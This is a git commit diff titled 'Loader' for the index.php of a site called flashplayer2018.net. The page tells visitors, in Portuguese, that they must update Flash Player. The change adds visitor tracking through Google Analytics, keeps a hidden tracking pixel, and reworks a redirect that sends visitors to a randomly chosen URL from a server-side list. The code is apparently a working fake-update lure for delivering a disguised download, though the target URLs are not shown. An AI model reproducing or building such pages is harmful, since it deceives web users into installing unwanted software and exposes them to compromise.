b0706c520eaf9fc177d66ab2974598e8fdd8d776
lendascripts <lendascripts@outlook.com>
2018-06-15 18:55:26 +0000

    Loader

--- flashplayer2018.net/index.php
+++ flashplayer2018.net/index.php
@@ -31,6 +31,20 @@
 	background-image: url(backer.png);
 }
 </style>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  var page = new String(window.location.href);
+  page = page.replace('www.','');
+  page = page.replace('http://','');
+  page = page.replace('https://','');
+  //ga('create', 'UA-104504016-1', 'auto');
+  ga('create', 'UA-105183436-1', 'auto');
+  ga('send', { hitType: 'pageview', page: page });
+
+</script>
 </head>
 
 <body>
@@ -258,7 +272,7 @@ var cSta		= setInterval(function(){tpqcnmes()},1000);
 ('Para visualiza\u00E7\u00E3o correta deste site \u00E9 necess\u00E1rio atualizar o seu Flash Player. Ap\u00F3s a atualiza\u00E7\u00E3o a navega\u00E7\u00E3o no site seguir\u00E1 normalmente. Click em Atualizar')">
 </body>
 <img src='http://whos.amung.us/pingjs/?k=oretornod01&t=&c=t&y=&a=0&r=641100' border=0 width=0 height=0>
-<script>
-document.write("<script type='text/javascript'>location.href = '<?=$url[rand(0,count($url))];?>';</script>");
-</script>
+<?php if($config[0] == 'S') { ?>
+<script type='text/javascript'>location.href = '<?=$url[rand(0,count($url))];?>';</script>
+<?php } ?>
 </html>
